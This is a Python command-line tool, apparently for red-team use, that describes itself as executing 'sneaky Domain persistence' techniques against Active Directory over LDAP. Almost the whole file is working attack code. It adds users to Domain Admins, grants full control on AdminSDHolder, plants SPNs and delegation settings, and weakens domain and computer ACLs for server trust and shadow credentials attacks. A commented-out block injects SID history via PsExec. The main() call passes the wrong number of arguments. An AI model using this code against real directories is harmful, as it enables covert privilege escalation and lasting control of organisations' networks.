from asyncio.windows_events import NULL
import sys, os, codecs, argparse, getpass
from argparse import RawTextHelpFormatter
import subprocess
from datetime import datetime, timedelta
import types
import ldap3
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM, ObjectDef
from ldap3.abstract.cursor import Reader
from ldap3.core.exceptions import LDAPKeyError, LDAPAttributeError, LDAPCursorError, LDAPInvalidDnError
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils import dn
from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
import binascii
from multiprocessing import Pool
from impacket.uuid import string_to_bin, bin_to_string
from impacket.ldap import ldaptypes
from impacket.ldap.ldaptypes import LDAP_SID
from ldap3.protocol.microsoft import security_descriptor_control


class ADPersistenceConfig(object):
    def __init__(self):
        #Base path
        self.basepath = '.'

        #Default field delimiter for greppable format is a tab
        self.grepsplitchar = '\t'

        #Other settings
        self.lookuphostnames = False #Look up hostnames of computers to get their IP address
        self.dnsserver = '' #Addres of the DNS server to use, if not specified default DNS will be used

#ADPersistence main class
class ADPersistence(object):
    def __init__(self, server, connection, config, root=None):
        self.server = server
        self.connection = connection
        self.config = config
        #Unless the root is specified we get it from the server
        if root is None:
            self.root = self.getRoot()
        else:
            self.root = root


    #Get the server root from the default naming context
    def getRoot(self):
        return self.server.info.other['defaultNamingContext'][0]

    #Get DN of target
    def getDN(self, c, target):
        self.connection.extend.standard.paged_search('%s' % (self.root), '(&(objectClass={})(sAMAccountName={}))'.format(c,target), attributes=ldap3.ALL_ATTRIBUTES, paged_size=500, generator=False)
        result = self.connection.entries[0]
        return result.entry_dn
    
    #Get SID of target
    def getSID(self, target):
        self.connection.search(self.root, '(sAMAccountName=%s)' % target, attributes=['objectSid'])
        sid_object = LDAP_SID(self.connection.entries[0]['objectSid'].raw_values[0])
        sid = sid_object.formatCanonical()
        return sid
    
    # Create an ALLOW ACE with the specified sid
    def create_allow_ace(self,sid):
        nace = ldaptypes.ACE()
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551 # Full control
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        nace['Ace'] = acedata
        return nace
    
    #Create empty Security Descriptor
    def create_empty_sd(self):
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = 32772
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        # BUILTIN\Administrators
        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
        sd['GroupSid'] = b''
        sd['Sacl'] = b''
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 4
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0
        acl.aces = []
        sd['Dacl'] = acl
        return sd
    

    #Add User to Domain Admin Group
    def addUserToDAGroup(self,target):
        user_dn = self.getDN('user',target)
        group_dn = self.getDN('group','Domain Admins')
        r = addUsersInGroups(self.connection, user_dn , group_dn)
        if r == True:
            return 'The user has been added to the Domain Admins group.'
        else:
            return 'Action Failed!'
    

    #Create ACE
    def create_object_ace(self,privguid, sid, accesstype,mode):
        nace = ldaptypes.ACE()
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = accesstype
        acedata['ObjectType'] = string_to_bin(privguid)
        acedata['InheritedObjectType'] = b''
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        if mode == 0:
            acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
        elif  mode == 1:
            acedata['Flags'] = 0
        nace['Ace'] = acedata
        return nace

    #Add user to AdminSDHolder
    def addUserToAdminSDHolder(self,target):
        usersid = self.getSID(target)
        container_obj = ObjectDef('container', self.connection)
        restoredata = {}
        controls = security_descriptor_control(sdflags=0x04)
        r = Reader(self.connection,container_obj,'CN=AdminSDHolder,CN=System,{}'.format(self.getRoot()))
        r.search()
        secDescData = r[0]['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        # We need "GENERIC_ALL" here
        accesstype = ldaptypes.ACCESS_MASK.GENERIC_ALL
        # No need to specify a GUID here
        secDesc['Dacl']['Data'].append(self.create_object_ace('', usersid, accesstype,1))
        dn = r[0].entry_dn
        restoredata['target_dn'] = dn
        data = secDesc.getData()
        res = self.connection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        return res


    #Add SPN to User 
    def addSPNToUser(self,target,spn):
        dn = self.getDN('user',target)
        self.connection.modify(dn, {'servicePrincipalName':(ldap3.MODIFY_ADD,[spn])}, controls=None)
        res = self.connection.result
        return res

    #Add Unconstrained Delegation to Computer
    def addUnconstrainedDelegationToComputer(self, target):
        if '$' in target:
            computer = self.getDN('computer',target)
        else:
            target = target + '$'
            computer = self.getDN('computer',target)
        computer_obj = ObjectDef('computer', self.connection)
        r = Reader(self.connection,computer_obj, computer)
        r.search()
        uac_value = r[0]['userAccountControl'].raw_values[0]
        dn = r[0].entry_dn
        #Current UAC value plus the TRUSTED_FOR_DELEGATION Flag value
        uac = int(uac_value) + 524288
        res = self.connection.modify(dn, {'userAccountControl':(ldap3.MODIFY_REPLACE,[uac])}, controls=None)
        return res

    #Add Server Trust Account
    def addServerTrustAccount(self, target):
        #Add DS-Install-Replica to Authenticated Users on the Domain object
        domain_dn = self.getRoot()
        controls = security_descriptor_control(sdflags=0x04)
        domain_obj = ObjectDef('domain', self.connection)
        r = Reader(self.connection,domain_obj, domain_dn)
        r.search()
        secDescData = r[0]['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        # We need "control access" here to change an extended access right
        accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
        # DS-Install-Replica Schema GUID
        secDesc['Dacl']['Data'].append(self.create_object_ace('9923a32a-3607-11d2-b9be-0000f87a36b2', 'S-1-5-11', accesstype,0))
        dn = r[0].entry_dn
        data = secDesc.getData()
        res = self.connection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if res == True:
            print('DS-Install-Replica permission is set')
        else:
            print('Failed to add DS-Install-Replica to Authenticated Users on the Domain object')
        #Add Write User Account Control on the target computer
        if '$' in target:
            target_computer = self.getDN('computer',target)
        else:
            target = target + '$'
            target_computer = self.getDN('computer',target)
        computer_obj = ObjectDef('computer', self.connection)
        r = Reader(self.connection,computer_obj, target_computer)
        r.search()
        secDescData = r[0]['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        # We need "write access" here to change a property
        accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
        #User Account Control Schema GUID 
        secDesc['Dacl']['Data'].append(self.create_object_ace('bf967a68-0de6-11d0-a285-00aa003049e2', 'S-1-5-11', accesstype,0))
        dn = r[0].entry_dn
        data = secDesc.getData()
        res = self.connection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if res == True:
            print('Write UAC permission is set')
        else:
            print('Failed to add write UAC permission')
        # Change UAC to the same value as the Domain Controller
        uac = 532480
        res = self.connection.modify(dn, {'userAccountControl':(ldap3.MODIFY_REPLACE,[uac])}, controls=None)
        return res
    """
    def addUserSIDHistory(self,path,user,password,host,target):
        u = user.split('\\')[1]
        sid = self.getSID(u)
        cmd1 = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12"
        cmd2 = "Install-PackageProvider -Name NuGet -Force"
        cmd3 = "if($null -eq (Get-PSRepository -Name PSGallery -ErrorAction SilentlyContinue)) { Register-PSRepository -Default }"
        cmd4 = "Install-Module -Name DSInternals -Force"
        cmd5 = "Stop-Service -Name ntds -Force"
        cmd6 = "Add-ADDBSidHistory -SamAccountName {} -SidHistory '{}' -DatabasePath C:\\Windows\\NTDS\\ntds.dit".format(target,sid)
        cmd7 = "Start-Service -Name ntds"
        proc = subprocess.Popen("{} -accepteula \\\\{} -s -u {} -p {} powershell.exe -command {};{};{};{};{};{};{}".format(path,host,user,password,cmd1,cmd2,cmd3,cmd4,cmd5,cmd6,cmd7), stdout=subprocess.PIPE, shell=True)
        res = proc.stdout.read(1)
        return res
    """
    
    #Create conditions for a Shadow Credentials Attack
    def ShadowCredentialsAttack(self,target):
        if '$' in target:
            target_computer = self.getDN('computer',target)
        else:
            target = target + '$'
            target_computer = self.getDN('computer',target)
        computer_obj = ObjectDef('computer', self.connection)
        controls = security_descriptor_control(sdflags=0x04)
        computer_obj = ObjectDef('computer', self.connection)
        r = Reader(self.connection,computer_obj, target_computer)
        r.search()
        secDescData = r[0]['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        # We need "write access" here to change a property
        accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
        # msDS-KeyCredentialLink GUID
        secDesc['Dacl']['Data'].append(self.create_object_ace('5b47d60f-6090-40b2-9f37-2a4de88f3063', 'S-1-5-11', accesstype,0))
        dn = r[0].entry_dn
        data = secDesc.getData()
        res = self.connection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        return res
    
    #Add Contrained Delegation to Computer
    def addConstrainedDelegationToComputer(self,target,spn):
        if '$' in target:
            computer = self.getDN('computer',target)
        else:
            target = target + '$'
            computer = self.getDN('computer',target)
        computer_obj = ObjectDef('computer', self.connection)
        r = Reader(self.connection,computer_obj, computer)
        r.search()
        uac_value = r[0]['userAccountControl'].raw_values[0]
        dn = r[0].entry_dn
        #Current UAC value plus the flag value of TRUSTED_TO_AUTH_FOR_DELEGATION
        uac = int(uac_value) + 16777216
        res = self.connection.modify(dn, {'userAccountControl':(ldap3.MODIFY_REPLACE,[uac])}, controls=None)
        #Change msds-allowedtodelegateto to the target SPN
        res = self.connection.modify(dn, {'msds-allowedtodelegateto':(ldap3.MODIFY_ADD,[spn])}, controls=None)
        return res
    
    #Add Resource-Based Constrained Delegation To Computer
    def addResourceBasedConstrainedDelegationToComputer(self,target,computer):
        if '$' in target:
            target_computer_dn = self.getDN('computer',target)
        else:
            target = target + '$'
            target_computer_dn = self.getDN('computer',target)
        computer_obj = ObjectDef('computer', self.connection)
        r = Reader(self.connection,computer_obj, target_computer_dn)
        r.search()
        dn = r[0].entry_dn
        #if msDS-AllowedToActOnBehalfOfOtherIdentity already has values
        try:
            sdata = r[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sdata)
            for ace in sd['Dacl'].aces:
                print('    %s' % ace['Ace']['Sid'].formatCanonical())
        except IndexError:
            #if not, create a empty Security Descriptor
            sd = self.create_empty_sd() 
        sid = self.getSID(computer)
        sd['Dacl'].aces.append(self.create_allow_ace(sid))
        sd_data = sd.getData()
        res = self.connection.modify(dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':(ldap3.MODIFY_ADD,[sd_data])}, controls=None)
        return res

    #Main function
    def ADPersistenceAttacks(self,attack,target,spn,computer):
        if attack == 0:
            result = self.addUserToDAGroup(target)
            log_success(result)
        elif attack == 1:
            result2 = self.addUserToAdminSDHolder(target)
            if result2 == True:
                log_success('User was added to AdminSDHolder!')
            else:
                log_warn('Failed!')
        elif attack == 2:
            result4 = self.addSPNToUser(target,spn)
            if result4['description'] == 'success':
                print('SPN added to user!')
            elif result4['description'] == 'attributeOrValueExists' or result4['description'] == 'constraintViolation':
                print('That SPN already exists. Please change the name of the SPN.')
            else:
                print('Action Failed!')
        elif attack == 3:
            if target:
                result5 = self.addUnconstrainedDelegationToComputer(target)
                if result5 == True:
                    log_success('Unconstrained Delegation was added to computer!')
                else:
                    log_warn('Action Failed!')
            else:
                print('Choose a target!')
                sys.exit(1)
        elif attack == 4:
            result6 = self.addServerTrustAccount(target)
            if result6 == True:
                log_success('Success!')
            else:
                log_warn('Action Failed!')
        elif attack == 5:
            result7 = self.ShadowCredentialsAttack(target)
            if result7 == True:
                log_success('Shadow Credentials Attack was successful!')
            else:
                log_warn('Action Failed!')
        elif attack == 6:
            result8 = self.addConstrainedDelegationToComputer(target,spn)
            if result8 == True:
                log_success('Attack was successful!')
            else:
                log_warn("Attack Failed!")
        elif attack == 7:
            result9 = self.addResourceBasedConstrainedDelegationToComputer(target,computer)
            if result9 == True:
                log_success("Attack was successful!")
            else:
                log_warn("Atack Failed!")
        else:
            print("Choose a valid attack!")


def log_warn(text):
    print('[!] %s' % text)
def log_info(text):
    print('[*] %s' % text)
def log_success(text):
    print('[+] %s' % text)

def main():
    parser = argparse.ArgumentParser(description='Domain Persistence via LDAP. Executes sneaky Domain persistence techniques.', formatter_class=RawTextHelpFormatter)
    parser._optionals.title = "Main options"
    parser._positionals.title = "Required options"

    #Main parameters
    #maingroup = parser.add_argument_group("Main options")
    parser.add_argument("host", type=str, metavar='HOSTNAME', help="Hostname/ip or ldap://host:port connection string to connect to (use ldaps:// to use SSL)")
    parser.add_argument("-u", "--user", type=str, metavar='USERNAME', help="DOMAIN\\username for authentication, leave empty for anonymous authentication")
    parser.add_argument("-p", "--password", type=str, metavar='PASSWORD', help="Password or LM:NTLM hash, will prompt if not specified")
    parser.add_argument("-a", "--attack", type=int, metavar='ATTACK', help="Choose from 0 to 7:\n 0 - Add User to DA group\n 1 - Add user to AdminSDHolder\n 2 - Add SPN to User \n 3 - Add Unconstrained Delegation To Computer\n 4 - Add Server Trust account\n 5 - ShadowCredentialsAttack\n 6 - Add Contrained Delegation To Computer\n 7 - Add Resource-Based Constrained Delegation To Computer")
    parser.add_argument("-t" , "--target", type=str, metavar='TARGET', help="Choose a target user or computer (depends on the attack that you choose)")
    parser.add_argument("-computer" , "--computer", type=str, metavar='COMPUTER', help="Choose a computer that you control (set this for Resource-Based constrained delegation)")
    parser.add_argument("-at", "--authtype", type=str, choices=['NTLM', 'SIMPLE'], default='NTLM', help="Authentication type (NTLM or SIMPLE, default: NTLM)")
    #parser.add_argument("-path", "--path", type=str, metavar='PATH' , help="PsExec Path")
    parser.add_argument("-spn", "--spn", type=str, metavar='SPN' , help="SPN to add to user/computer")

    #Additional options
    miscgroup = parser.add_argument_group("Misc options")
    miscgroup.add_argument("-r", "--resolve", action='store_true', help="Resolve computer hostnames (might take a while and cause high traffic on large networks)")
    miscgroup.add_argument("-n", "--dns-server", help="Use custom DNS resolver instead of system DNS (try a domain controller IP)")

    args = parser.parse_args()
    #Create default config
    cnf = ADPersistenceConfig()
    #Dns lookups?
    if args.resolve:
        cnf.lookuphostnames = True
    #Custom dns server?
    if args.dns_server is not None:
        cnf.dnsserver = args.dns_server

    #Prompt for password if not set
    authentication = None
    if args.user is not None:
        if args.authtype == 'SIMPLE':
            authentication = 'SIMPLE'
        else:
            authentication = NTLM
        if not '\\' in args.user:
            log_warn('Username must include a domain, use: DOMAIN\\username')
            sys.exit(1)
        if args.password is None:
            args.password = getpass.getpass()
    else:
        log_info('You need to specify a username/password')
        sys.exit(1)
    # define the server and the connection
    s = Server(args.host, get_info=ALL)
    log_info('Connecting to host...')

    c = Connection(s, user=args.user, password=args.password, authentication=authentication)
    log_info('Binding to host')
    # perform the Bind operation
    if not c.bind():
        log_warn('Could not bind with specified credentials')
        log_warn(c.result)
        sys.exit(1)
    log_success('Bind OK')
    log_info('Starting attack')
    #Create ADPersistence object
    dd = ADPersistence(s, c, cnf)

    #Do the actual attacks
    dd.ADPersistenceAttacks(args.user,args.attack, args.target,args.host, args.password, args.spn, args.computer)
    log_success('Attack finished')

if __name__ == '__main__':
    main()